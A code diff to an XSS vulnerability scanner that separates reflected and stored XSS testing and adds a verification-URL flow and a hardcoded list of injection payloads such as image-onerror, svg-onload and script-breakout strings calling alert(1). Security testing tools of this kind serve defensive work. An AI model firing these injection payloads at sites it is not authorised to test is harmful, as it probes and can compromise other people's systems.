@@ -11,7 +11,7 @@ from core.filterChecker import filterChecker
 from core.generator import generator
 from core.htmlParser import htmlParser
 from core.requester import requester
-from core.utils import getUrl, getParams, getVar, flattenParams
+from core.utils import getUrl, getParams, getVar, flattenParams, replaceValue
 from core.wafDetector import wafDetector
 from core.log import setup_logger
 from core.stored_xss_verifier import verify_stored_xss
@@ -33,8 +33,15 @@ def scan(target, paramData, encoding, headers, delay, timeout, skipDOM, skip):
         except:
             target = 'http://' + target
     logger.debug('Scan target: {}'.format(target))
-    response = requester(target, {}, headers, method, delay, timeout).text
+    
+    # Determine which URL to use for reflection/DOM checks
+    # For non-GET methods with verifyUrl, use verifyUrl for checking reflections
+    check_url = core.config.verifyUrl if (core.config.verifyUrl and not GET) else target
+    use_verify_for_reflection = (core.config.verifyUrl and not GET)
+    
+    response = requester(check_url, {}, headers, 'GET' if use_verify_for_reflection else method, delay, timeout).text
 
+    # DOM XSS check (only if we have HTML response)
     if not skipDOM:
         logger.run('Checking for DOM vulnerabilities')
         highlighted = dom(response)
@@ -45,6 +52,7 @@ def scan(target, paramData, encoding, headers, delay, timeout, skipDOM, skip):
             for line in highlighted:
                 logger.no_format(line, level='good')
             logger.red_line(level='good')
+    
     host = urlparse(target).netloc  # Extracts host out of the url
     logger.debug('Host to scan: {}'.format(host))
     url = getUrl(target, GET)
@@ -68,140 +76,239 @@ def scan(target, paramData, encoding, headers, delay, timeout, skipDOM, skip):
             paramsCopy[paramName] = encoding(xsschecker)
         else:
             paramsCopy[paramName] = xsschecker
-        response = requester(url, paramsCopy, headers, method, delay, timeout)
-        occurences = htmlParser(response, encoding)
+        
+        # Inject payload into target URL
+        inject_response = requester(url, paramsCopy, headers, method, delay, timeout)
+        
+        # Check for reflections
+        # For non-GET methods with verifyUrl, check reflections on verifyUrl
+        if use_verify_for_reflection:
+            logger.debug('Using verify URL for reflection check: {}'.format(check_url))
+            check_response = requester(check_url, {}, headers, 'GET', delay, timeout)
+        else:
+            check_response = inject_response
+        
+        occurences = htmlParser(check_response, encoding)
         positions = occurences.keys()
         logger.debug('Scan occurences: {}'.format(occurences))
-        if not occurences:
-            logger.error('No reflection found')
-            continue
-        else:
+        
+        # ===== Reflected/DOM XSS Detection Flow =====
+        has_reflection = len(occurences) > 0
+        reflected_xss_tested = False
+        
+        if has_reflection:
             logger.info('Reflections found: %i' % len(occurences))
+            reflected_xss_tested = True
+            
+            # Test reflected XSS
+            _test_reflected_xss(
+                url, paramsCopy, headers, method, delay, timeout, encoding,
+                occurences, check_response.text, check_url, use_verify_for_reflection,
+                paramName, params, GET, skip
+            )
+        else:
+            logger.error('No reflection found for reflected XSS detection')
+        
+        # ===== Stored XSS Detection Flow (Independent) =====
+        if core.config.verifyUrl:
+            logger.run('Testing for stored XSS')
+            _test_stored_xss(
+                url, paramsCopy, headers, method, delay, timeout,
+                paramName, params, GET, skip
+            )
+        
+        logger.no_format('')
 
-        logger.run('Analysing reflections')
-        efficiencies = filterChecker(
-            url, paramsCopy, headers, method, delay, occurences, timeout, encoding)
-        logger.debug('Scan efficiencies: {}'.format(efficiencies))
-        logger.run('Generating payloads')
-        vectors = generator(occurences, response.text)
-        total = 0
-        for v in vectors.values():
-            total += len(v)
-        if total == 0:
-            logger.error('No vectors were crafted.')
-            continue
-        logger.info('Payloads generated: %i' % total)
-        progress = 0
-        # Flag variable: used to skip current parameter in skip mode
-        skip_current_param = False
-        for confidence, vects in vectors.items():
+
+def _test_reflected_xss(url, paramsCopy, headers, method, delay, timeout, encoding,
+                        occurences, response_text, check_url, use_verify_for_reflection,
+                        paramName, params, GET, skip):
+    """Test for reflected XSS vulnerabilities"""
+    logger.run('Analysing reflections')
+    positions = occurences.keys()
+    efficiencies = filterChecker(
+        check_url if use_verify_for_reflection else url, 
+        paramsCopy if not use_verify_for_reflection else {},
+        headers, 
+        'GET' if use_verify_for_reflection else method, 
+        delay, occurences, timeout, encoding
+    )
+    logger.debug('Scan efficiencies: {}'.format(efficiencies))
+    logger.run('Generating payloads')
+    vectors = generator(occurences, response_text)
+    total = 0
+    for v in vectors.values():
+        total += len(v)
+    if total == 0:
+        logger.error('No vectors were crafted.')
+        return
+    logger.info('Payloads generated: %i' % total)
+    progress = 0
+    skip_current_param = False
+    
+    for confidence, vects in vectors.items():
+        if skip_current_param:
+            break
+        for vect in vects:
             if skip_current_param:
-                break  # Break out of confidence loop
-            for vect in vects:
-                if skip_current_param:
-                    break  # Break out of vect loop
-                if core.config.globalVariables['path']:
-                    vect = vect.replace('/', '%2F')
-                loggerVector = vect
-                progress += 1
-                logger.run('Progress: %i/%i\r' % (progress, total))
-                if not GET:
-                    vect = unquote(vect)
+                break
+            if core.config.globalVariables['path']:
+                vect = vect.replace('/', '%2F')
+            loggerVector = vect
+            progress += 1
+            logger.run('Progress: %i/%i\r' % (progress, total))
+            if not GET:
+                vect = unquote(vect)
+            
+            # Inject payload and check on appropriate URL
+            if use_verify_for_reflection:
+                # Inject to target, check on verify URL
+                from core.utils import replaceValue
+                requester(url, replaceValue(paramsCopy, xsschecker, vect, copy.deepcopy), 
+                         headers, method, delay, timeout)
+                efficiencies, snippets = checker(
+                    check_url, {}, headers, 'GET', delay, vect, positions, timeout, encoding)
+            else:
+                # Standard reflected XSS check
                 efficiencies, snippets = checker(
                     url, paramsCopy, headers, method, delay, vect, positions, timeout, encoding)
-                if not efficiencies:
-                    for i in range(len(occurences)):
-                        efficiencies.append(0)
-                        snippets.append('')
-                bestEfficiency = max(efficiencies)
+            
+            if not efficiencies:
+                for i in range(len(occurences)):
+                    efficiencies.append(0)
+                    snippets.append('')
+            bestEfficiency = max(efficiencies)
+            
+            if bestEfficiency > minEfficiency or (vect[0] == '\\' and bestEfficiency >= 95):
+                index = efficiencies.index(bestEfficiency)
+                occurenceList = list(occurences.values())
                 
-                # Check for stored XSS if verify_url is provided
-                stored_xss_found = False
-                stored_xss_method = None
-                stored_xss_context = None
+                if index >= len(occurenceList) or index >= len(snippets):
+                    logger.warning('Index mismatch detected, skipping this payload')
+                    continue
                 
-                if core.config.verifyUrl:
-                    # Verify stored XSS
-                    stored_xss_found, stored_xss_method, stored_xss_context = verify_stored_xss(
-                        core.config.verifyUrl,
-                        core.config.verifyMethod,
-                        vect,
-                        delay,
-                        timeout,
-                        use_js_render=core.config.jsRender
-                    )
-                    
-                    if stored_xss_found:
-                        # Stored XSS detected - report it
-                        logger.red_line()
-                        logger.good('Stored XSS Detected!')
-                        logger.good('Payload: %s' % loggerVector)
-                        logger.info('Parameter: %s' % paramName)
-                        logger.info('Injection URL: %s' % url)
-                        logger.info('Verification URL: %s' % core.config.verifyUrl)
-                        logger.info('Detection Method: %s' % stored_xss_method)
-                        logger.info('Confidence: %i' % confidence)
-                        
-                        if stored_xss_method and 'interactive' in stored_xss_method:
-                            logger.info('Trigger Type: %s (requires user interaction)' % stored_xss_method.replace('interactive_', ''))
-                        else:
-                            logger.info('Trigger Type: Immediate (on page load)')
-                        
-                        if stored_xss_context:
-                            context_preview = stored_xss_context[:200] if len(stored_xss_context) > 200 else stored_xss_context
-                            logger.info('Context: %s' % context_preview.replace('st4r7s', '').replace('3nd', ''))
-                        
-                        logger.red_line()
-                        
-                        # For stored XSS, we always want to continue checking other payloads
-                        # unless user explicitly stops
-                        if not skip:
-                            choice = input(
-                                '%s Stored XSS found! Would you like to continue scanning? [y/N] ' % que).lower()
-                            if choice != 'y':
-                                quit()
-                        else:
-                            # In skip mode, continue to next parameter after finding stored XSS
-                            logger.info('Skipping remaining payloads for parameter: %s' % paramName)
-                            skip_current_param = True
-                            break
-                
-                # Original reflected XSS detection
-                if bestEfficiency > minEfficiency or (vect[0] == '\\' and bestEfficiency >= 95):
-                    index = efficiencies.index(bestEfficiency)
-                    occurenceList = list(occurences.values())
-                    
-                    # Safety check: ensure index is within bounds
-                    if index >= len(occurenceList) or index >= len(snippets):
-                        logger.warning('Index mismatch detected, skipping this payload')
-                        continue
-                    
-                    bestSnippet = snippets[index]
-                    bestContext = occurenceList[index]['context']
+                bestSnippet = snippets[index]
+                bestContext = occurenceList[index]['context']
 
-                    logger.red_line()
-                    logger.good('Reflected XSS Detected!' if not stored_xss_found else 'Reflected XSS Also Detected!')
-                    logger.good('Payload: %s' % loggerVector)
-                    logger.info('Parameter: %s' % paramName)
-                    logger.info('Context: %s' % bestContext)
-                    logger.info('Efficiency: %i' % bestEfficiency)
-                    logger.info('Confidence: %i' % confidence)
-                    if GET:
-                        logger.info('Reproduction: %s%s' % (url, flattenParams(paramName, params, loggerVector)))
-                    
-                    # Clean up snippet for display
-                    bestSnippet = bestSnippet.replace('st4r7s', '').replace('3nd', '')
-                    logger.info('Reflection: %s' % bestSnippet)
+                logger.red_line()
+                logger.good('Reflected XSS Detected!')
+                logger.good('Payload: %s' % loggerVector)
+                logger.info('Parameter: %s' % paramName)
+                logger.info('Context: %s' % bestContext)
+                logger.info('Efficiency: %i' % bestEfficiency)
+                logger.info('Confidence: %i' % confidence)
+                if GET:
+                    logger.info('Reproduction: %s%s' % (url, flattenParams(paramName, params, loggerVector)))
+                elif use_verify_for_reflection:
+                    logger.info('Injection URL: %s' % url)
+                    logger.info('Reflection URL: %s' % check_url)
+                
+                bestSnippet = bestSnippet.replace('st4r7s', '').replace('3nd', '')
+                logger.info('Reflection: %s' % bestSnippet)
+                logger.red_line()
 
-                    if bestEfficiency == 100 or (vect[0] == '\\' and bestEfficiency >= 95):
-                        if not skip:
-                            choice = input(
-                                '%s Would you like to continue scanning? [y/N] ' % que).lower()
-                            if choice != 'y':
-                                quit()
-                        else:
-                            # Skip mode: after finding a vulnerability, skip current parameter and continue with next
-                            logger.info('Skipping remaining payloads for parameter: %s' % paramName)
-                            skip_current_param = True
-                            break  # Break out of vect loop
-        logger.no_format('')
+                if bestEfficiency == 100 or (vect[0] == '\\' and bestEfficiency >= 95):
+                    if not skip:
+                        choice = input(
+                            '%s Would you like to continue scanning? [y/N] ' % que).lower()
+                        if choice != 'y':
+                            quit()
+                    else:
+                        logger.info('Skipping remaining payloads for parameter: %s' % paramName)
+                        skip_current_param = True
+                        break
+
+
+def _test_stored_xss(url, paramsCopy, headers, method, delay, timeout,
+                     paramName, params, GET, skip):
+    """Test for stored XSS vulnerabilities independently"""
+    from core.generator import generator
+    from core.config import getPayloadConfig
+    
+    # Generate payloads for stored XSS testing
+    # Use a simplified context since we don't have reflection info
+    config = getPayloadConfig()
+    
+    # Create a basic set of high-confidence payloads for stored XSS
+    stored_vectors = []
+    for tag in config['tags']:
+        for eventHandler in config['eventHandlers']:
+            if tag in config['eventHandlers'][eventHandler]:
+                for function in config['functions']:
+                    if tag == 'script' and eventHandler == 'direct':
+                        stored_vectors.append('<%s>%s</%s>' % (tag, function, tag))
+                    elif eventHandler != 'direct':
+                        stored_vectors.append('<%s %s=%s>' % (tag, eventHandler, function))
+    
+    # Add some common stored XSS payloads
+    stored_vectors.extend([
+        '<img src=x onerror=alert(1)>',
+        '<svg onload=alert(1)>',
+        '<body onload=alert(1)>',
+        '\"><script>alert(1)</script>',
+        '\' onmouseover=alert(1) ',
+    ])
+    
+    total = len(stored_vectors)
+    logger.info('Testing %i stored XSS payloads' % total)
+    progress = 0
+    skip_current_param = False
+    
+    for vect in stored_vectors:
+        if skip_current_param:
+            break
+        
+        if core.config.globalVariables['path']:
+            vect = vect.replace('/', '%2F')
+        loggerVector = vect
+        progress += 1
+        logger.run('Progress: %i/%i\r' % (progress, total))
+        
+        if not GET:
+            test_vect = unquote(vect)
+        else:
+            test_vect = vect
+        
+        # Inject payload
+        inject_params = replaceValue(paramsCopy, xsschecker, test_vect, copy.deepcopy)
+        requester(url, inject_params, headers, method, delay, timeout)
+        
+        # Verify stored XSS
+        stored_xss_found, stored_xss_method, stored_xss_context = verify_stored_xss(
+            core.config.verifyUrl,
+            core.config.verifyMethod,
+            test_vect,
+            delay,
+            timeout,
+            use_js_render=core.config.jsRender
+        )
+        
+        if stored_xss_found:
+            logger.red_line()
+            logger.good('Stored XSS Detected!')
+            logger.good('Payload: %s' % loggerVector)
+            logger.info('Parameter: %s' % paramName)
+            logger.info('Injection URL: %s' % url)
+            logger.info('Verification URL: %s' % core.config.verifyUrl)
+            logger.info('Detection Method: %s' % stored_xss_method)
+            
+            if stored_xss_method and 'interactive' in stored_xss_method:
+                logger.info('Trigger Type: %s (requires user interaction)' % stored_xss_method.replace('interactive_', ''))
+            else:
+                logger.info('Trigger Type: Immediate (on page load)')
+            
+            if stored_xss_context:
+                context_preview = stored_xss_context[:200] if len(stored_xss_context) > 200 else stored_xss_context
+                logger.info('Context: %s' % context_preview.replace('st4r7s', '').replace('3nd', ''))
+            
+            logger.red_line()
+            
+            if not skip:
+                choice = input(
+                    '%s Stored XSS found! Would you like to continue scanning? [y/N] ' % que).lower()
+                if choice != 'y':
+                    quit()
+            else:
+                logger.info('Skipping remaining payloads for parameter: %s' % paramName)
+                skip_current_param = True
+                break
